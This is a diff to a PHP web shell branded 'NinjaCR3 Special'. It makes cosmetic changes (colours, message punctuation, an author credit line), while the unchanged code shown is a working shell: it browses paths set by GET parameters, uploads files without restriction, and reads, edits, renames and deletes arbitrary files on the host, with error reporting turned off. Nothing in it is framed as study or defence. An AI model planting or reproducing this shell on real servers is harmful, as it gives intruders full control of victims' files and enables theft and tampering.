@@ -4,8 +4,8 @@ error_reporting(0);
 if(get_magic_quotes_gpc()){foreach($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}}
 ?>
 <!DOCTYPE html><html><head><link href="" rel="stylesheet" type="text/css"><title>NinjaCR3 Special</title>
-<style type="text/css">body{background: black;color:#eceff1;font-family:'Verdana';margin:0;font-size: 14px;}h1{font-family:'verdana';font-weight:normal;font-size:60px;margin:0;}h1:hover{color:#ffee58;}select{background:white;color:black;}a{color:white;text-decoration:none;font-family:'Verdana'}textarea{width:900px;height:250px;background:transparent;border:1px dashed white;color:white;padding:2px;}tr.first{border-bottom:1px dashed white;}tr:hover{background: black;}th{background: black;padding:5px;}</style>
-</head><body> <?php echo'<div style="color:white;margin-top:0;"><br><center><img src="https://www.fontspace.com/api/render/font/KerX/eyJ0ZXh0IjoiTklOSkFDUjMiLCJmb250c2l6ZSI6ODAsInIiOiJnZGkiLCJmZ2MiOiIjZmZmZmZmIiwiYmdjIjoiIzAwMDAwMCIsIndpZHRoIjoxMDAwLCJoZWlnaHQiOjIwMH0.png"><h2>NinjaCR3 Special<br>Recoded by NinjaCR3</center></h2></div>';
+<style type="text/css">body{background: #1C1615;color:#eceff1;font-family:'Verdana';margin:0;font-size: 14px;}h1{font-family:'verdana';font-weight:normal;font-size:60px;margin:0;}h1:hover{color:#ffee58;}select{background:white;color:#4C3A36;}a{color:white;text-decoration:none;font-family:'Verdana'}textarea{width:900px;height:250px;background:transparent;border:1px dashed white;color:white;padding:2px;}tr.first{border-bottom:1px dashed white;}tr:hover{background: #4C3A36;}th{background: #4C3A36;padding:5px;}</style>
+</head><body> <?php echo'<div style="color:white;margin-top:0;"><br><center><h2>NinjaCR3 Special<br>Coded by NinjaCR3</center></h2></div>';
 if(isset($_GET['path'])) {$path = $_GET['path'];chdir($_GET['path']);} else {$path = getcwd();}
 $path = str_replace("\\","/",$path);$paths = explode("/", $path);
 echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';echo "<font style='font-size:13px;'>Path: ";
@@ -16,8 +16,8 @@ echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><fo
 <input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo '<center><font color="#00ff00">Upload OK!.</font></center><br/>';}
-else{echo '<center><font color="white">Upload Failed!.</font></center><br/>';}}
+echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';}
+else{echo '<center><font color="white">Upload Failed!</font></center><br/>';}}
 echo '</td></tr><tr><td></table>';
 if(isset($_GET['filesrc'])){
 echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';echo "".basename($_GET['filesrc']);"";echo '</tr></td></table><br />';echo("<center><textarea readonly=''>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></center>");}
@@ -34,8 +34,8 @@ echo '<form method="POST">New Name : <input name="newname" type="text" size="20"
 <input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
 }elseif($_POST['opt'] == 'edit'){
 if(isset($_POST['src'])){
-$fp = fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
-}else{echo '<center><font color="white">Edit File Failed!.</font></center><br />';}fclose($fp);}
+$fp = fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo '<center><font color="#00ff00">Edit File OK!</font></center><br />';
+}else{echo '<center><font color="white">Edit File Failed!</font></center><br />';}fclose($fp);}
 echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';}echo '</center>';}else{echo '</table><br /><center>';
 if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
 if($_POST['type'] == 'dir'){
@@ -43,8 +43,8 @@ if(rmdir($_POST['path'])){
 echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
 }else{echo '<center><font color="white">Delete Dir Failed!</font></center><br />';}
 }elseif($_POST['type'] == 'file'){
-if(unlink($_POST['path'])){echo '<font color="#00ff00">Delete File Done.</font><br />';}else{
-echo '<font color="white">Delete File Error.</font><br />';}}}echo '</center>';
+if(unlink($_POST['path'])){echo '<font color="#00ff00">Delete File Done!</font><br />';}else{
+echo '<font color="white">Delete File Error!</font><br />';}}}echo '</center>';
 $scandir = scandir($path);
 echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first">
 <th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th>
@@ -69,4 +69,4 @@ echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file"))."";
 echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
 echo '</table></div>';}echo '</body></html>';
 function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';} $info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}
-echo'<br><center>Recoded by <a href="https://github.com/NinjaCR3">NinjaCR3</a></center><br>';?>
+echo'<br><center>Coded by <a href="https://github.com/NinjaCR3">NinjaCR3</a></center><br>';?>
